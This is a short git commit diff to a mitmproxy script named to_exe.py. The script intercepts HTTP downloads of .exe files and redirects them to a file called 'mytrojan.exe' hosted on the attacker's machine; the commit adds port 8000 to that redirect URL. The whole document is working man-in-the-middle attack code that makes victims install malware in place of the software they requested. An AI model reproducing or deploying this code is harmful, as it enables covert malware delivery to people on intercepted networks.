973743c75f172c1bc7fd0b194c2c05b8dbfa370e
barisozbas <32777706+barisozbas@users.noreply.github.com>
2019-05-25 12:02:47 +0300

    update
    port added

--- Scripts/to_exe.py
+++ Scripts/to_exe.py
@@ -5,4 +5,4 @@ localhost = socket.gethostbyname(socket.gethostname())
 
 def request(flow):
     if flow.request.host != localhost and flow.request.pretty_url.endswith(".exe"):
-        flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location" : "http://" + localhost + "/mytrojan.exe"})
+        flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location" : "http://" + localhost + ":8000/mytrojan.exe"})
